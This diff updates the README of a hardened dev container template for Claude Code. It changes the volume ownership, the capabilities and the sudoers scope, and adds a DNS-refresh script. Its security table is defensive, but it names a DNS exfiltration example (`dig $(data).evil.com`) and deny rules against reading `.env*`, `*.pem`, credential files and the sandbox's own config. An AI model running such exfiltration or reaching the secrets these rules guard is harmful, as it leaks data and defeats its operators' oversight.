@@ -17,6 +17,13 @@ A hardened, production-ready dev container template that gives your team:
 4. Customize `init-firewall.sh` with your internal domains
 5. Open in VS Code/Cursor and click **"Reopen in Container"**
 
+> **Upgrading an existing project?** Volume ownership is now set at build time (the
+> `node_modules` and `.bun` named volumes inherit their owner from the image). This
+> only applies to *fresh* volumes. If you previously ran an older version of this
+> template, your existing volumes may still be root-owned and cause `EPERM` on
+> `bun install`. Reset them once: `docker volume rm claude-nodemodules-<id> claude-bunstore-<id>`
+> (or prune project volumes), then rebuild.
+
 ## What's included
 
 ```
@@ -25,7 +32,7 @@ A hardened, production-ready dev container template that gives your team:
   Dockerfile              # Hardened image with Bun + Claude Code + non-root user
   managed-settings.json   # Org policy (highest precedence, overrides user settings)
   init-firewall.sh        # Default-deny egress firewall with domain allowlist
-  chown-volumes.sh        # Fix Docker volume ownership for non-root user
+  refresh-firewall-dns.sh # Re-resolves allowlisted domains so CDN IPs stay live
 
 .claude/
   settings.json           # Project-level Claude Code permissions (deny .devcontainer access)
@@ -64,7 +71,7 @@ This template implements defence in depth with multiple security layers, drawing
 | **Read-only .devcontainer** | `.devcontainer/` is mounted read-only inside the container, preventing Claude from modifying its own sandbox config. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer) |
 | **Deny rules (managed settings)** | Managed settings deny Claude from reading/editing `.devcontainer/**`, `.env*`, `*.pem`, `*credentials*`, `.claude/settings.json`, `.git/hooks/**`, `.github/workflows/**`. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer), security audit |
 | **Bypass mode disabled** | `disableBypassPermissionsMode: "disable"` prevents `--dangerously-skip-permissions` from nullifying all deny rules. | Security audit |
-| **Cap-drop ALL + selective add** | All Linux capabilities dropped, only `NET_ADMIN` and `NET_RAW` added back (for firewall). Scoped sudoers limits root access to two whitelisted scripts only. | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), [centminmod](https://github.com/centminmod/claude-code-devcontainers) |
+| **Cap-drop ALL + selective add** | All Linux capabilities dropped, then only the minimal set added back: `NET_ADMIN`/`NET_RAW` (firewall) and `SETUID`/`SETGID` (so `sudo` can elevate to run the firewall script). Scoped sudoers limits root access to a single whitelisted script. | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), [centminmod](https://github.com/centminmod/claude-code-devcontainers) |
 | **Resource limits** | `pids-limit=256`, `memory=8g`, `ulimit nofile=1024:4096`, `ulimit core=0` (no core dumps). | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), security audit |
 | **DNS tunneling mitigation** | DNS restricted to Docker's embedded resolver at `127.0.0.11` only. Prevents exfiltration via `dig $(data).evil.com`. | Security audit |
 | **Cloud metadata blocking** | Explicit REJECT rules for `169.254.169.254` and `169.254.169.253` (AWS/Azure/GCP metadata). | Security audit |
@@ -74,7 +81,7 @@ This template implements defence in depth with multiple security layers, drawing
 | **Firewall idempotency** | Lock file prevents re-running firewall script, eliminating the flush-and-rebuild race window. | Security audit |
 | **Network egress firewall** | Default-deny iptables. Only `api.anthropic.com`, GitHub, and configured domains reachable. | [Anthropic official](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh) |
 | **Bun supply chain hardening** | Bun ignores lifecycle scripts by default (unlike npm). No postinstall code execution unless explicitly trusted. | [Bun docs](https://bun.sh/docs/cli/install#lifecycle-scripts) |
-| **Scoped sudoers** | Only firewall and volume-ownership scripts can run as root. No broad `NOPASSWD:ALL`. | Production pattern |
+| **Scoped sudoers** | Only the firewall script can run as root. No broad `NOPASSWD:ALL`. | Production pattern |
 | **Managed settings** | `/etc/claude-code/managed-settings.json` enforces org policy at highest precedence. | [Anthropic docs](https://code.claude.com/docs/en/devcontainer#enforce-organization-policy) |
 | **No host secrets** | `~/.ssh`, `~/.aws`, `docker.sock` are never mounted. Use SSH agent forwarding or scoped tokens. | All community repos |
 
@@ -178,10 +185,11 @@ Add markdown files to `.claude/commands/` (pattern from [awattar/claude-code-bes
 
 If you use external network controls, remove from `devcontainer.json`:
 - The `NET_ADMIN` and `NET_RAW` entries in `runArgs`
+- The `SETUID` and `SETGID` entries in `runArgs` (only needed so `sudo` can run the firewall script — with no firewall, nothing uses `sudo`)
 - `postStartCommand`
 - `waitFor`
 
-And remove `init-firewall.sh` and firewall packages from the `Dockerfile`.
+And remove `init-firewall.sh`, `refresh-firewall-dns.sh`, `firewall-allowed-domains.conf`, and the firewall packages from the `Dockerfile` (plus the scoped sudoers line).
 
 ### Alternative: proxy-based egress filtering
 
@@ -219,7 +227,7 @@ For a composable, language-aware approach, see [smithclay/claudetainer](https://
 | Supply chain hardening (bun/npm) | Yes | Yes | -- | -- | -- |
 | Scoped sudoers (least-privilege) | Yes | -- | -- | -- | -- |
 | DNS TCP fallback fix | Yes | -- | -- | -- | -- |
-| Volume ownership fix script | Yes | -- | -- | -- | -- |
+| Build-time volume ownership | Yes | -- | -- | -- | -- |
 | Managed settings | Yes | -- | -- | -- | -- |
 | Bubblewrap (bwrap) | Yes | Yes | -- | -- | -- |
 | SYS_ADMIN check/block | Yes | Yes | -- | -- | -- |
